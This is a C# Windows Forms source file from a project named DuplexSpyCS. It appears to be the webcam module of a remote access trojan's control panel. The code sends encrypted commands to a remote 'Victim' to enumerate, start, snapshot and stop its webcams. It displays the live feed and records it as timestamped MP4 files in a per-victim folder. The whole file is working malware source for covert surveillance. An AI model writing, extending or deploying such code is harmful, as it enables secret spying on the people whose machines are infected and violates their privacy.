using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenCvSharp;

namespace DuplexSpyCS
{
    public partial class frmWebcam : Form
    {
        public Victim v;
        private bool capture = false;

        //FPS
        private Label fps_label;
        private int fps_cnt = 0;
        private DateTime fps_last;
        private TimeSpan fps_span;

        //Record
        private VideoWriter videoWriter;
        private SemaphoreSlim fileLock;
        private bool isProcessing = false;

        public frmWebcam()
        {
            InitializeComponent();
        }

        private void UpdateDelay(int nDelay)
        {

        }

        public async void ShowImage(string b64_img, string szDatetime)
        {
            if (isProcessing)
                return;

            isProcessing = true;
            try
            {
                bool record = false;
                Image image = C1.Base64ToImage(b64_img);
                v.img_LastWebcam = image;
                Invoke(new Action(() =>
                {
                    if (toolStripButton8.Checked)
                        image.RotateFlip(RotateFlipType.RotateNoneFlipX);
                    pictureBox1.Image = image;
                    fps_cnt++;

                    record = toolStripButton5.Checked;
                }));

                if (record)
                {
                    int imgWidth = image.Size.Width;
                    int imgHeight = image.Size.Height;
                    if (videoWriter == null)
                    {
                        string mp4_file = Path.Combine(new string[]
                        {
                            v.dir_victim,
                            "Webcam",
                            C1.GenerateFileName("mp4"),
                        });

                        videoWriter = new VideoWriter(mp4_file, FourCC.MP4V, 10, new OpenCvSharp.Size(imgWidth, imgHeight));
                        fileLock = new SemaphoreSlim(1, 1);
                    }

                    await Task.Run(async () =>
                    {
                        await fileLock.WaitAsync();
                        Invoke(new Action(() =>
                        {
                            try
                            {
                                Image imgCopy = null;
                                try
                                {
                                    lock (image)
                                    {
                                        imgCopy = new Bitmap(image);
                                    }

                                    try
                                    {
                                        if (imgCopy == null)
                                            return;

                                        using (var frame = ImageToMat(imgCopy))
                                        {
                                            if (frame.Width != imgWidth || frame.Height != imgHeight)
                                                Cv2.Resize(frame, frame, new OpenCvSharp.Size(imgWidth, imgHeight));

                                            Cv2.PutText(
                                                frame,
                                                szDatetime,
                                                new OpenCvSharp.Point(30, 30),
                                                HersheyFonts.HersheySimplex,
                                                1.0,
                                                Scalar.White,
                                                2,
                                                LineTypes.AntiAlias
                                            );

                                            if (videoWriter.IsOpened())
                                            {
                                                Invoke(new Action(() =>
                                                {
                                                    videoWriter.Write(frame);
                                                }));
                                            }
                                            else
                                            {

                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {

                                    }
                                    finally
                                    {
                                        if (imgCopy != null)
                                            imgCopy.Dispose();
                                    }
                                }
                                catch (InvalidOperationException ex)
                                {

                                }
                            }
                            catch
                            {

                            }
                            finally
                            {
                                fileLock.Release();
                            }
                        }));
                    });
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
            finally
            {
                isProcessing = false;
            }
        }

        private Mat ImageToMat(Image img)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                img.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                ms.Seek(0, SeekOrigin.Begin);

                return Mat.ImDecode(ms.ToArray(), ImreadModes.Color);
            }
        }

        void Snapshot()
        {
            v.encSend(2, 0, "webcam|snapshot|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
        }
        void Start()
        {
            capture = true;
            fps_last = DateTime.Now;
            v.encSend(2, 0, "webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
            timer1.Start();
        }
        void Stop()
        {
            capture = false;
            v.encSend(2, 0, "webcam|stop");
            timer1.Stop();
        }

        public void Init(string data)
        {
            Invoke(new Action(() =>
            {
                foreach (string device in data.Split(','))
                {
                    toolStripComboBox1.Items.Add(device);
                }

                toolStripComboBox1.SelectedIndex = 0;
            }));
        }

        void setup()
        {
            v.encSend(2, 0, "webcam|init");

            toolStripButton4.Checked = true;
            toolStripButton8.Checked = false;

            toolStripComboBox2.SelectedIndex = 1;

            fps_label = new Label();
            fps_label.Text = "";
            fps_label.Location = new System.Drawing.Point(0, 0);
            fps_label.Font = new Font("Arial", 12, FontStyle.Bold);
            fps_label.BackColor = Color.Transparent;
            fps_label.ForeColor = Color.LimeGreen;
            pictureBox1.Controls.Add(fps_label);
            pictureBox1.Image = Resources.Resource.NoSignal;
        }

        private void frmWebcam_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (capture)
                v.encSend(2, 0, "webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            if (toolStripComboBox1.Items.Count > 0)
                Start();
            else
                MessageBox.Show("No webcam is selected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (toolStripComboBox1.Items.Count > 0)
                Stop();
            else
                MessageBox.Show("No webcam is selected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (toolStripComboBox1.Items.Count > 0)
                Snapshot();
            else
                MessageBox.Show("No webcam is selected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            fps_span = DateTime.Now - fps_last;
            if (fps_span.Seconds >= 1)
            {
                fps_label.ForeColor = fps_cnt <= 10 ? Color.Red : Color.LimeGreen;
                fps_label.Text = $"{fps_cnt} Hz";
                fps_cnt = 0;
                fps_last = DateTime.Now;
            }
        }

        private void toolStripButton4_CheckedChanged(object sender, EventArgs e)
        {
            if (toolStripButton4.Checked)
                fps_label.Show();
            else
                fps_label.Hide();
        }

        private void frmWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isProcessing)
            {
                DialogResult dr = MessageBox.Show("Webcam is running, are you sure to quit?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dr == DialogResult.No)
                    return;
            }

            v.encSend(2, 0, "webcam|stop");
            timer1.Stop();
        }

        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            Image img = pictureBox1.Image;
            if (img == null)
            {
                MessageBox.Show("NULL Image", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.InitialDirectory = v.dir_victim;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    img.Save(sfd.FileName);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton5_CheckedChanged(object sender, EventArgs e)
        {
            //Stop recording
            if (videoWriter == null)
                return;

            if (!toolStripButton5.Checked)
            {
                if (videoWriter.IsOpened())
                {
                    videoWriter.Release();
                    videoWriter = null;
                }
            }
        }

        private void toolStripButton7_Click(object sender, EventArgs e)
        {
            string szDirName = Path.Combine(v.dir_victim, "Webcam");
            if (Directory.Exists(szDirName))
            {
                Process.Start("explorer.exe", $"\"{szDirName}\"");
            }
            else
            {
                MessageBox.Show("Cannot find folder: " + szDirName, "Folder not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripButton8_CheckStateChanged(object sender, EventArgs e)
        {
            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
            {
                v.SendCommand($"webcam|delay|{toolStripComboBox2.Text}");
            }
        }

        private void toolStripComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
            {
                v.SendCommand($"webcam|delay|{toolStripComboBox2.Text}");
            }
        }
    }
}
